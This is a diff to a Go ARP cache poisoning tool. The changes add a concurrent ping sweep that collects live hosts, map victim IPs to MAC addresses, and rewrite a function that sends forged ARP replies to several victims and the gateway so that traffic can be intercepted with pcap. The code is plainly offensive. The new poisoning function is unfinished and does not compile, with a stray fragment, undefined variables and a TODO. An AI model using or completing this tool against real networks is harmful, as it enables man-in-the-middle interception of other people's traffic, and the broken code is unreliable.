@@ -29,24 +29,30 @@ func checkIPs(ips ...string) error {
 	return nil
 }
 
-func ping(ips ...string) {
+func ping(ips []net.IP) []net.IP {
+	var liveAddresses []net.IP
+	var lock sync.Mutex
 	var wg sync.WaitGroup
 
 	for _, ip := range ips {
 		wg.Add(1)
-		go func(ip string) {
+		go func(ip net.IP) {
 			defer wg.Done()
-			fmt.Println("pinging ", ip)
-			cmd := exec.Command("ping", ip)
+			fmt.Println("pinging ", ip.String())
+			cmd := exec.Command("ping", ip.String())
 			if err := cmd.Run(); err != nil {
-				fmt.Println("failed to ping ", ip)
+				fmt.Println("failed to ping ", ip.String())
 				return
 			}
-			fmt.Println("successfully pinged ", ip)
+			fmt.Println("successfully pinged ", ip.String())
+			lock.Lock()
+			liveAddresses = append(liveAddresses, ip)
+			lock.Unlock()
 		}(ip)
 	}
-
 	wg.Wait()
+
+	return liveAddresses
 }
 
 type DeviceInfo struct {
@@ -61,8 +67,8 @@ func NewDeviceInfo(ip net.IP, mac net.HardwareAddr) *DeviceInfo {
 	}
 }
 
-func mapIPstoMAC(ips ...string) ([]*DeviceInfo, error) {
-	ping(ips...)
+func mapIPstoMAC(ips []net.IP) ([]*DeviceInfo, error) {
+	ping(ips)
 
 	var devices []*DeviceInfo
 
@@ -89,7 +95,7 @@ func mapIPstoMAC(ips ...string) ([]*DeviceInfo, error) {
 
 			fields := strings.Fields(line)
 
-			if ip == fields[0] {
+			if ip.String() == fields[0] {
 				mac, err := net.ParseMAC(fields[1])
 				if err != nil {
 					return nil, err
@@ -167,16 +173,44 @@ func getAllIPs(attackerIP net.IP) []net.IP {
 	return addresses
 }
 
-func poisonARPCacheMultiple(gateway *DeviceInfo, victims []*DeviceInfo, attackerInfo *AttackerInfo, deviceHandle *pcap.Handle) error {
-	for _, victim := range victims {
-		if err := sendARPReply(gateway, victim, attackerInfo, deviceHandle); err != nil {
-			return err
-		}
+// TODO
+func poisonARPCacheMultiple(gateway net.IP, victims []net.IP, attackerInfo *AttackerInfo, deviceHandle *pcap.Handle) error {
+	var wg sync.WaitGroup
 
-		if err := sendARPReply(victim, gateway, attackerInfo, deviceHandle); err != nil {
-			return err
-		}
+	liveDevices := ping(victims)
+
+	vicDevices, err := mapIPstoMAC(liveDevices)
+	if err != nil {
+		return err
 	}
+
+	lenDevices := len(vicDevices)
+
+	gatewayDev
+
+	for _, victim := range devices[:len(devices)-1] {
+		wg.Add(1)
+
+		go func(victim *DeviceInfo) {
+			defer wg.Done()
+			defer func() {
+				if err := recover(); err != nil {
+					fmt.Println("error poisoning device: (", victim.IP.String(), ",", victim.MAC.String(), ")")
+				}
+			}()
+
+			if err := sendARPReply(gateway, victim, attackerInfo, deviceHandle); err != nil {
+				panic(err)
+			}
+
+			if err := sendARPReply(victim, gateway, attackerInfo, deviceHandle); err != nil {
+				panic(err)
+			}
+
+		}(victim)
+	}
+
+	wg.Wait()
 
 	return nil
 }
@@ -292,6 +326,10 @@ func readPackets(deviceHandle *pcap.Handle) {
 	}
 }
 
+var (
+	incorrectIPFormatErr = errors.New("err: incorrect IP format")
+)
+
 func main() {
 	if len(os.Args) != 4 {
 		fmt.Println("usage: <interface> <gateway ip> <victim2 ip>")
@@ -299,11 +337,14 @@ func main() {
 	}
 
 	interfaceStr := os.Args[1]
-	victim1IPStr := os.Args[2]
-	victim2IPStr := os.Args[3]
+	gatewayIP := net.ParseIP(os.Args[2])
+	if gatewayIP == nil {
+		log.Fatal(incorrectIPFormatErr)
+	}
 
-	if err := checkIPs(victim1IPStr, victim2IPStr); err != nil {
-		log.Fatal(err)
+	victimIP := net.ParseIP(os.Args[3])
+	if victimIP == nil {
+		log.Fatal(incorrectIPFormatErr)
 	}
 
 	attackerInfo, err := getAttackerInfo(interfaceStr)
@@ -322,7 +363,7 @@ func main() {
 	}
 	defer deviceHandle.Close()
 
-	devicesInfo, err := mapIPstoMAC(victim1IPStr, victim2IPStr)
+	devicesInfo, err := mapIPstoMAC([]net.IP{gatewayIP, victimIP})
 	if err != nil {
 		log.Fatal(err)
 	}
